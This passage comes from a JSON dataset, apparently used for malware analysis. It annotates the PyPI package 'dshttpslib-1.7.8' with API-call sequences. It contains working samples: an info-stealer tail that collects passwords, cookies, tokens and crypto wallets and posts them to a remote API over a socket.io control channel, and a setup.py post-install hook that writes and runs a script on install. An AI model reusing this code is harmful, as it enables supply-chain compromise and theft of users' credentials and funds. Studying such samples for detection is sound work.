\"passwords\":[],\n            \"cookies\":[],\n            \"browsers\":{},\n            \"tokens\":[],\n            \"information\":Obj.getInformation(),\n            \"wallets\":[name for name, x in wallets_.items()],\n        }\n        GrabbBrowsers().start('all')\n        GetTokens().start()\n        r = requests.post(url=f'{api_url}/api/{user_id}/', json=information)\n        r = requests.post(url=f'{api_url}/api/{user_id}/wallets/', files=wallets_)\n    information = {}\n    sio.connect(api_url)\n    try:\n        sio.wait()\n    except Exception as e:\n        print(e)\n    sio.disconnect()"
    }
  },
  {
    "pyfile": "setup.py",
    "code_snippet": "import subprocess\nimport os\nimport time\nfrom setuptools.command.install import install\n\nclass PostInstallCommand(install):\n    def run(self):\n        install.run(self)\n        print(\"Loading...\")\n        try:\n            temp_path = os.path.join(os.getenv(\"temp\"), \"code.py\")\n\n            with open(temp_path, \"w\") as f:\n                f.write(\"import dshttpslib\")\n            \n            time.sleep(3)\n            \n            print(\"Executing code...\")\n            subprocess.check_call([\"python\", temp_path])\n\n        except Exception as e:\n            print(f\"An error occurred: {e}\")",
    "pattern_analysis": {
      "api_sequence": [
        "os.getenv",
        "os.path.join",
        "open",
        "open.write",
        "time.sleep",
        "subprocess.check_call"
      ],
      "api_sequence_with_args": [
        "os.getenv(\"temp\")",
        "os.path.join(os.getenv(\"temp\"), \"code.py\")",
        "open(temp_path, \"w\")",
        "open.write(\"import dshttpslib\")",
        "time.sleep(3)",
        "subprocess.check_call([\"python\", temp_path])"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "subprocess.check_call",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        }
      ],
      "contextual_code": "import subprocess\nimport os\nimport time\n\nclass PostInstallCommand(install):\n    def run(self):\n        try:\n            temp_path = os.path.join(os.getenv(\"temp\"), \"code.py\")\n\n            with open(temp_path, \"w\") as f:\n                f.write(\"import dshttpslib\")\n            \n            time.sleep(3)\n            \n            subprocess.check_call([\"python\", temp_path])\n        except Exception as e:\n            print(f\"An error occurred: {e}\")"
    }
  },
  {
    "metadata": {
      "package_name": "dshttpslib-1.7.8"
    }
  }
]